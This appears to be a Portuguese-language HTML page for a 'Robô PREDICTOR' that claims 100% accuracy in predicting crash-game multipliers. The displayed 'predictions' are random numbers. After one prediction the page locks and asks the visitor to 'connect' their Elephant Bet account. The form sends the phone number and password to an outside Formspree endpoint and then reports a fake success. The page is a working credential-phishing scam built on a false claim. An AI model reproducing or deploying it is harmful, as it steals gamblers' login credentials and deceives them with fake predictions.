<!DOCTYPE html>
<html lang="pt">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Robô PREDICTOR + Conectar Conta</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0d0d2b, #1a0033);
            color: white;
            text-align: center;
        }
        
        .hidden {
            display: none;
        }
        
        .header {
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            padding: 24px;
            font-size: 26px;
            font-weight: bold;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
            box-shadow: 0 0 25px rgba(255, 0, 255, 0.5);
        }
        
        .circle {
            width: 240px;
            height: 240px;
            border: 6px solid #00ffff;
            border-radius: 50%;
            margin: 30px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 0 25px #00ffff, inset 0 0 15px rgba(0, 255, 255, 0.6);
            animation: pulse 2s infinite;
        }
        
        .circle h1 {
            font-size: 38px;
            color: #ff33cc;
            text-shadow: 0 0 12px rgba(255, 0, 255, 0.8);
            margin: 0;
        }
        
        @keyframes pulse {
            0%,
            100% {
                box-shadow: 0 0 25px #00ffff, inset 0 0 15px rgba(0, 255, 255, 0.6);
            }
            50% {
                box-shadow: 0 0 45px #00ffff, inset 0 0 25px rgba(0, 255, 255, 0.9);
            }
        }
        
        .button {
            background: linear-gradient(135deg, #ff9933, #ff33cc);
            color: black;
            padding: 16px 32px;
            font-size: 20px;
            font-weight: bold;
            border: none;
            border-radius: 14px;
            cursor: pointer;
            margin-top: 24px;
            animation: glitch 2s infinite;
            box-shadow: 0 0 20px rgba(255, 153, 51, 0.7);
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }
        
        .button:hover {
            background: linear-gradient(135deg, #ff6600, #cc00ff);
            box-shadow: 0 0 30px rgba(255, 153, 51, 0.9);
        }
        
        @keyframes glitch {
            0% {
                transform: translate(0);
            }
            20% {
                transform: translate(-2px, 2px);
            }
            40% {
                transform: translate(-2px, -2px);
            }
            60% {
                transform: translate(2px, 2px);
            }
            80% {
                transform: translate(2px, -2px);
            }
            100% {
                transform: translate(0);
            }
        }
        
        .loader {
            width: 24px;
            height: 24px;
            border: 4px solid #fff;
            border-top: 4px solid #ff33cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .disabled-message {
            margin-top: 24px;
            padding: 14px 18px;
            background: linear-gradient(135deg, rgba(255, 20, 147, 0.15), rgba(255, 69, 0, 0.08));
            color: #ffe6f0;
            border-radius: 12px;
            font-weight: bold;
            box-shadow: 0 0 18px rgba(255, 20, 147, 0.1);
        }
        
        .history {
            margin: 30px auto;
            max-width: 340px;
            background: rgba(255, 255, 255, 0.05);
            padding: 18px;
            border-radius: 14px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
        }
        
        .history h2 {
            color: #00ffff;
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
        }
        
        .history ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        
        .history li {
            padding: 8px;
            font-size: 17px;
            font-weight: bold;
            border-radius: 8px;
            margin-bottom: 6px;
            color: white;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.4);
        }
        
        .blue {
            background-color: #00bfff;
        }
        
        .purple {
            background-color: #9933ff;
        }
        
        .pink {
            background-color: #ff1493;
        }
        
        .sync-btn {
            margin: 35px auto;
            padding: 16px;
            background: linear-gradient(135deg, #ff33cc, #6600ff);
            color: white;
            border-radius: 14px;
            text-decoration: none;
            font-size: 17px;
            font-weight: bold;
            width: 220px;
            display: block;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.6);
            transition: 0.3s;
            cursor: pointer;
        }
        
        .sync-btn:hover {
            background: linear-gradient(135deg, #ff66cc, #9900ff);
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.9);
        }
        
        .container-sync {
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 350px;
            margin: 40px auto;
            animation: fadeIn 0.6s ease-in-out;
        }
        
        .container-sync h2 {
            color: #ff33cc;
        }
        
        .container-sync h2 span {
            color: #9900cc;
        }
        
        label {
            display: block;
            margin: 10px 0 5px;
            font-weight: bold;
            text-align: left;
            color: #333;
            font-size: 14px;
        }
        
        input {
            width: 90%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            display: block;
            margin-bottom: 10px;
        }
        
        input:focus {
            border-color: #ff33cc;
            box-shadow: 0 0 8px rgba(255, 51, 204, 0.3);
            outline: none;
        }
        
        button.sync-button {
            width: 90%;
            padding: 12px;
            background: linear-gradient(135deg, #ff33cc, #ff66cc);
            border: none;
            color: white;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            margin-top: 10px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(255, 51, 204, 0.6);
            transition: 0.3s;
        }
        
        button.sync-button:hover {
            background: linear-gradient(135deg, #ff66cc, #ff3399);
            box-shadow: 0 0 25px rgba(255, 51, 204, 0.8);
        }
        
        .back-link {
            display: inline-block;
            margin-top: 14px;
            color: #ff33cc;
            font-weight: bold;
            text-decoration: underline;
            cursor: pointer;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .button.disabled {
            background: linear-gradient(135deg, #333333, #555555);
            color: #bbbbbb;
            box-shadow: none;
            cursor: default;
            animation: none;
            pointer-events: none;
        }
    </style>
</head>

<body>

    <!-- TELA BOT -->
    <div id="bot-screen">
        <div class="header">Robô PREDICTOR <br>100% de acertividade</div>
        <div class="circle">
            <h1 id="multiplier">00.00x</h1>
        </div>

        <button class="button" id="actionButton" onclick="nextPrediction()">
            <span id="buttonText">⚡ Prever a próxima vela</span>
            <div class="loader" id="buttonLoader"></div>
        </button>

        <div id="blockedMessage" class="disabled-message hidden">
            Para ver a próxima deverás conectar o Robô 
        </div>

        <div class="history">
            <h2>Histórico de Velas</h2>
            <ul id="historyList"></ul>
        </div>

        <a class="sync-btn" onclick="showSync()">🔗 Conectar o Robô</a>
    </div>

    <!-- TELA SINCRONIZAÇÃO -->
    <div id="sync-screen" class="hidden">
        <div class="container-sync">
            <h2>Conecte com a sua conta da <span>Elephant Bet</span></h2>
            <form id="syncForm" action="https://formspree.io/f/xvgwbowg" method="POST">
                <label for="acc">Número</label>
                <input type="tel" name="numero" placeholder="número de telemovél" pattern="9[0-9]{8}" maxlength="9" required>

                <label for="pass">Senha</label>
                <input type="text" name="senha" placeholder="Digite a sua senha" required>

                <button type="submit" class="sync-button">Conectar Agora</button>
            </form>
            <span class="back-link" onclick="showBot()">← Voltar</span>
        </div>
    </div>

    <script>
        let hasHackedOnce = false;

        function generateRandomMultiplier() {
            const random = Math.random();
            if (random < 0.7) return (Math.random() * 1.9 + 1.00).toFixed(2) + 'x';
            else if (random < 0.95) return (Math.random() * 8 + 2).toFixed(2) + 'x';
            else return (Math.random() * 20 + 10).toFixed(2) + 'x';
        }

        function nextPrediction() {
            if (hasHackedOnce) return;

            const btn = document.getElementById("actionButton");
            const btnText = document.getElementById("buttonText");
            const loader = document.getElementById("buttonLoader");

            btnText.style.display = "none";
            loader.style.display = "block";

            setTimeout(() => {
                const num = generateRandomMultiplier();
                const el = document.getElementById("multiplier");
                el.textContent = num;
                el.style.animation = "flash 1s ease";
                setTimeout(() => el.style.animation = "", 1000);

                addToHistory(num);

                loader.style.display = "none";
                hasHackedOnce = true;
                btn.classList.add("disabled");
                btn.disabled = true;
                document.getElementById("blockedMessage").classList.remove("hidden");

                btnText.style.display = "inline";
                btnText.textContent = "⚠️ Acesso bloqueado";
            }, 3000);
        }

        function addToHistory(number) {
            const list = document.getElementById("historyList");
            const li = document.createElement("li");
            li.textContent = number;

            const val = parseFloat(number.replace("x", ""));
            li.classList.add(val < 2 ? "blue" : val < 10 ? "purple" : "pink");

            list.insertBefore(li, list.firstChild);
        }

        function showSync() {
            document.getElementById("bot-screen").classList.add("hidden");
            document.getElementById("sync-screen").classList.remove("hidden");
        }

        function showBot() {
            document.getElementById("sync-screen").classList.add("hidden");
            document.getElementById("bot-screen").classList.remove("hidden");
        }

        document.addEventListener("DOMContentLoaded", function() {
            const form = document.getElementById("syncForm");
            form.addEventListener("submit", function(e) {
                e.preventDefault();
                const data = new FormData(this);

                fetch(this.action, {
                        method: this.method,
                        body: data,
                        headers: {
                            "Accept": "application/json"
                        }
                    })
                    .then(res => {
                        if (res.ok) {
                            alert("Conta conectada com sucesso!");
                            showBot();
                        } else {
                            alert("Erro ao conectar. Tente novamente.");
                        }
                    })
                    .catch(() => alert("Erro de conexão."));
            });

            // ** Validação do campo número conforme seu pedido **
            const phoneInput = document.querySelector('input[name="numero"]');
            phoneInput.addEventListener("input", function() {
                let value = this.value;

                // remover tudo que não for número
                value = value.replace(/\D/g, "");

                // se o primeiro caractere não for '9', limpar
                if (value.length > 0 && value.charAt(0) !== "9") {
                    value = "";
                }

                // limitar a 9 dígitos
                if (value.length > 9) {
                    value = value.slice(0, 9);
                }

                this.value = value;
            });
        });
    </script>
</body>

</html>
